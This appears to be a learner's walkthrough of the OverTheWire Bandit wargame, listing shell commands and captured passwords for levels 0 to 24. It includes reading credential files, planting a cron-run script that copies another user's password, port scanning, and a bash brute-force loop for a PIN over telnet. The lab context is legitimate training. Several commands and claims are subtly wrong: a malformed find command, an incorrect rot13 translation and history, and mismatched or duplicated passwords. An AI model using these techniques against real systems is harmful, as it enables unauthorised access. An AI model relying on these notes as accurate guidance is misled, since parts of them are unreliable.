## level 0:

`cat readme`: ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If

## Level 1:

`cat ./-` : 263JGJPfgU6LtdEvgfWU1XP5yac29mFx

## Level 2:

`cat ./'--spaces in this filename--'` : MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx

## Level 3:

`ls `
`ls -la`
`cd inherent`
`ls -la`
`cat ...Hidden-From-You`: MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx

## Level 4:

`ls`
`cd inherent`
`file ./<name file>` **this was doing in every file** to find a file with output: ASCII text
`cat ./-file07`: 4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw

## Level 5:

This command locates non-executable files under 1033 bytes in the current directory tree. It verifies each candidate's content type, filtering the results to display only those confirmed as plain ASCII text. Useful for identifying small, readable configuration or log files while excluding binaries and scripts.
`find . -size 1033c ! -executable -exec file {} \ | grep ":.*ASCII text"`:HWasnPhtq9AVKe0dmk45nxy20cvUa6EG

## Level 6:

`find / -user bandit7 -group bandit6 -size 33c 2>/dev/null`: morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj

## Level 7:

`grep -w "millionth" data.txt`: dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc

## Level 8:

`sort data.txt | uniq -u`: 4CKMh1JI91bUIZZPXDqGanal4xvAg0JM

## Level 9:

`strings -d data.txt`: FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey

## Level 10:

`base64 -d data.txt`: dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr

## Level 11:

rot13: is an encryptation system,where you replace a with the letter 13 after. Is a system invented for the romans.
`cat data.txt | tr 'A-Za-z0-9' 'N-ZA-Mn-za-m5-90-4'` : 7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4

## Level 12:

- `xxd -r data.txt > r-data.txt`: for revert the hexdump file to his original state
- `file -d r-data.txt`: for debbuging the file
- < rename file to specific .\* for decompresion >
- < decompress the file with the correct tool >
- < repet 7 times more this proccess >

- `cat data8.bin`: FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn

## Level 13:

- `cat sshkey.private`
- copy and paste in my local ./.ssh
- `chmod 600 <sshkey>`
- `ssh -i <directory file ssh key> bandit14@bandit.labs.overthewire.org -p 2220`
- bandit14: MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS

## Level 14:

- `hostname -i`
- `telnel 10.0.1.201 30000` (enter password bandit14, is in cat /etc/bandit_pass/bandit14): 8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo

## Level 15:

`openssl s_client -connect 10.0.1.162`: (enter password): kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx

## Level 16:

- `nmap -sV -p 31000-32000 localhost`
- `echo <current password level> | openssl s_client -connect localhost:31790 -quiet`
- copy private key
- in local: `nvim .ssh/bandit17`
- `chmod g-rw .ssh/bandit17`
- `chmod o-r .ssh/bandit17`
- `ssh -i <directory to private key> bandit17@<url> -p 2200 `

## Level 17:

`diff password.old password.new`: x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO

## Level 18:

`ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme`: cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8

## Level 19:

- `./bandit20*`
- `./bandit20* whoami`: bandit20
- `./bandit20* cat /etc/bandit20`:0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO

## Level 20:

- open a terminal 1 and execute `ncat -lvp <random port, like 9999>`
- open a second terminal 2 and execute `./suconnect 9999`
- in terminal 1: `0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO`: EeoULMCra2q0dSkYj561DX7s1CpBuOBt

## Level 21:

- `cd /etc/cron.d/`
- `ll`
- `cat cronjob_bandit22`
- `cat /usr/bin/cronjob-bandit22.sh`
- `cat tmp/jvnhfoeicn32r3420895r`:tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q

## Level 22:

- `cd /etc/cron.d`
- `ll`
- `cat cronjob_bandit23`
- `cat /usr/bin/cronjob-bandit23.sh`
- `cd /tmp`
- `cat $(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)`: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga

## Level 23:

- `cd /etc/cron.d`
- `ls`
- `cat cronjob_bandit22`
- `cat /usr/bin/cronjob_bandit24.sh`
- `cd /var/bandit24/foo/`
- `vim file.sh`

```bash
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/bandit24-pass-by-anon.txt
chmod 644 /tmp/bandit24-pass-by-anon.txt
```

- `chmod 777 file.sh`
- wait a litle moment
- `cat /tmp/bandit24-pass-by-anon.txt`:gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

## Level 24:

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

./bandit25-pass-by-anon.sh

bandit24@bandit:~$ echo "logs of telnet:" > /tmp/log-bandit24
bandit24@bandit:~$ cat tmp/log-bandit24
cat: tmp/log-bandit24: No such file or directory
bandit24@bandit:~$ cat /tmp/log-bandit24
logs of telnet:
bandit24@bandit:~$ touch /tmp/output-telnet-bandit24
bandit24@bandit:~$

````
```bash
#!/bin/bash

TELNET_IP="10.0.1.162"
TELNET_PORT="30002"
LOG_FILE="/tmp/telnet_bandit25_pass.log"
PASSWORD="iCi86ttT4KSNe1armKiwbQNmB3YJP3q4"


(
counter=0000
while [[ $counter -le 9999 ]]
do
echo "$PASSWORD $counter"
        ((counter++))
done
) | telnet "$TELNET_IP" "$TELNET_PORT" | tee "$LOG_FILE"

echo "Session complete. Log saved to $LOG_FILE"

````

iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
